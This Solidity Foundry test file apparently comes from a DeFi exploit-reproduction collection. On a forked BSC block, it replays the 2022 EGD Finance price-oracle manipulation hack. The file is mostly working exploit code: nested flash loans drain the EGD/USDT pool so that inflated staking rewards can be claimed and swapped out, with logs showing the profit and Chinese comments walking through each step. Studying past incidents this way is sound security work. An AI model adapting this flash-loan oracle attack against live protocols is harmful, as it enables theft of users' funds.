// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./interface.sol";


// @KeyInfo - Total Lost : ~36,044 US$
// Attacker : 0xee0221d76504aec40f63ad7e36855eebf5ea5edd
// Attack Contract : 0xc30808d9373093fbfcec9e026457c6a9dab706a7
// Vulnerable Contract : 0x34bd6dba456bc31c2b3393e499fa10bed32a9370 (Proxy)
// Vulnerable Contract : 0x93c175439726797dcee24d08e4ac9164e88e7aee (Logic)
// Attack Tx : https://bscscan.com/tx/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x93c175439726797dcee24d08e4ac9164e88e7aee#code#F1#L254
// Stake Tx : https://bscscan.com/tx/0x4a66d01a017158ff38d6a88db98ba78435c606be57ca6df36033db4d9514f9f8

// @Analysis
// Blocksec : https://twitter.com/BlockSecTeam/status/1556483435388350464
// PeckShield : https://twitter.com/PeckShieldAlert/status/1556486817406283776

// chinese version analysis:  https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/academy/onchain_debug/03_write_your_own_poc/ 


/*   
USAGE:::::::

$ forge test -vvv 
Logs:
  --------------------  Pre-work, stake 100 USDT to EGD Finance --------------------
  Tx: 0x4a66d01a017158ff38d6a88db98ba78435c606be57ca6df36033db4d9514f9f8
  Attacker Stake 100 USDT to EGD Finance
  -------------------------------- Start Exploit ----------------------------------
  [Start] Attacker USDT Balance: 0.000000000000000000
  [INFO] EGD/USDT Price before price manipulation: 0.008096310933284567
  [INFO] Current earned reward (EGD token): 0.000341874999999972
  Attacker manipulating price oracle of EGD Finance...
  Flashloan[1] : borrow 2,000 USDT from USDT/WBNB LPPool reserve
  Flashloan[1] received
  Flashloan[2] : borrow 99.99999925% USDT of EGD/USDT LP Pool reserve
  Flashloan[2] received
  [INFO] EGD/USDT Price after price manipulation: 0.000000000060722331
  Claim all EGD Token reward from EGD Finance contract
  [INFO] Get reward (EGD token): 5630136.300267721935770000
  Flashloan[2] payback success
  Swap the profit...
  Flashloan[1] payback success
  -------------------------------- End Exploit ----------------------------------
  [End] Attacker USDT Balance: 18062.915446991996902763

Test result: ok. 1 passed; 0 failed; finished in 1.24s

*/

IPancakePair constant USDT_WBNB_LPPool = IPancakePair(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
IPancakePair constant EGD_USDT_LPPool = IPancakePair(0xa361433E409Adac1f87CDF133127585F8a93c67d);
IPancakeRouter constant pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
address constant EGD_Finance = 0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370;
address constant usdt = 0x55d398326f99059fF775485246999027B3197955;
address constant egd = 0x202b233735bF743FA31abb8f71e641970161bF98;

contract Attacker is Test {
    function setUp() public {
        vm.createSelectFork("https://bsc-dataseed4.defibit.io/", 20_245_522);    // 设置链 和 历史区块 

        vm.label(address(USDT_WBNB_LPPool), "USDT_WBNB_LPPool");  // 用于区分 
        vm.label(address(EGD_USDT_LPPool), "EGD_USDT_LPPool");
        vm.label(address(pancakeRouter), "pancakeRouter");
        vm.label(EGD_Finance, "EGD_Finance");
        vm.label(usdt, "USDT");
        vm.label(egd, "EGD");
    }

    function testExploit() public {
        Exploit exploit = new Exploit();

        console.log("--------------------  Pre-work, stake 100 USDT to EGD Finance --------------------");
        console.log("Tx: 0x4a66d01a017158ff38d6a88db98ba78435c606be57ca6df36033db4d9514f9f8");
        console.log("Attacker Stake 100 USDT to EGD Finance");

        exploit.stake();         // 质押 
        vm.warp(1659914146); // block.timestamp = 2022-08-07 23:15:46(UTC)  调整区块时间  

        console.log("-------------------------------- Start Exploit ----------------------------------");
        emit log_named_decimal_uint("[Start] Attacker USDT Balance", IERC20(usdt).balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[INFO] EGD/USDT Price before price manipulation", IEGD_Finance(EGD_Finance).getEGDPrice(), 18);
        emit log_named_decimal_uint("[INFO] Current earned reward (EGD token)", IEGD_Finance(EGD_Finance).calculateAll(address(exploit)), 18);
        console.log("Attacker manipulating price oracle of EGD Finance...");

        exploit.harvest();    // 收割

        console.log("-------------------------------- End Exploit ----------------------------------");
        emit log_named_decimal_uint("[End] Attacker USDT Balance", IERC20(usdt).balanceOf(address(this)), 18);
    }
}

/* Contract 0x93c175439726797dcee24d08e4ac9164e88e7aee */
contract Exploit is Test {
    uint256 borrow1;
    uint256 borrow2;

    function stake() public {
        // Give exploit contract 100 USDT
        deal(address(usdt), address(this), 100 ether);     // 设定钱包余额 
        // Set invitor
        IEGD_Finance(EGD_Finance).bond(address(0x659b136c49Da3D9ac48682D02F7BD8806184e218));
        // Stake 100 USDT
        IERC20(usdt).approve(EGD_Finance, 100 ether);   // 常用套路  ERC-20 批准    后面的人就可以使用这笔资金  
        IEGD_Finance(EGD_Finance).stake(100 ether);     
    }

    function harvest() public {
        console.log("Flashloan[1] : borrow 2,000 USDT from USDT/WBNB LPPool reserve");
        borrow1 = 2000 * 1e18;                          
        USDT_WBNB_LPPool.swap(borrow1, 0, address(this), "0000");  // 去池子借 2000 USDT
        console.log("Flashloan[1] payback success");  // 第一笔闪电贷完成后   把钱转给黑客地址 
        IERC20(usdt).transfer(msg.sender, IERC20(usdt).balanceOf(address(this))); // refund all USDT
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        if (keccak256(data) == keccak256("0000")) {
            console.log("Flashloan[1] received");

            console.log("Flashloan[2] : borrow 99.99999925% USDT of EGD/USDT LPPool reserve");
            borrow2 = IERC20(usdt).balanceOf(address(EGD_USDT_LPPool)) * 9_999_999_925 / 10_000_000_000; // Attacker borrow 99.99999925% USDT of EGD_USDT_LPPool reserve
            EGD_USDT_LPPool.swap(0, borrow2, address(this), "00");  // 几乎抽干了 EGD_USDT 的池子 
            console.log("Flashloan[2] payback success");   // 第二笔闪电贷还清了

            // Swap all egd -> usdt
            console.log("Swap the profit...");
            address[] memory path = new address[](2);
            path[0] = egd;
            path[1] = usdt;
            IERC20(egd).approve(address(pancakeRouter), type(uint256).max);   // 批准给 Pancake  准备把 EGD 换成 USDT  
            pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                IERC20(egd).balanceOf(address(this)), 1, path, address(this), block.timestamp
            );
            // 还掉第一笔闪电贷 
            bool suc = IERC20(usdt).transfer(address(USDT_WBNB_LPPool), 2010 * 10e18); // Attacker payback 2,010 USDT (w/ 0.5% fee)
            require(suc, "Flashloan[1] payback failed");
        } else {
            console.log("Flashloan[2] received");
            emit log_named_decimal_uint("[INFO] EGD/USDT Price after price manipulation", IEGD_Finance(EGD_Finance).getEGDPrice(), 18);
            // -----------------------------------------------------------------
            console.log("Claim all EGD Token reward from EGD Finance contract");
            IEGD_Finance(EGD_Finance).claimAllReward();      // 在池子被抽干的前提下  价格预言机不起作用了  这里面就能得到很多的 EGD token  
            emit log_named_decimal_uint("[INFO] Get reward (EGD token)", IERC20(egd).balanceOf(address(this)), 18);
            // -----------------------------------------------------------------
            uint256 swapfee = amount1 * 3 / 1000; // Attacker pay 0.3% fee to Pancakeswap
            bool suc = IERC20(usdt).transfer(address(EGD_USDT_LPPool), amount1 + swapfee);  // 这是第二次闪电贷  抽干了 EGD_USDT 的池子 的那一笔    还 USDT 
            require(suc, "Flashloan[2] payback failed");
        }
    }
}
/* -------------------- Interface -------------------- */
interface IEGD_Finance {
    function bond(address invitor) external;
    function stake(uint256 amount) external;
    function calculateAll(address addr) external view returns (uint256);
    function claimAllReward() external;
    function getEGDPrice() external view returns (uint256);
}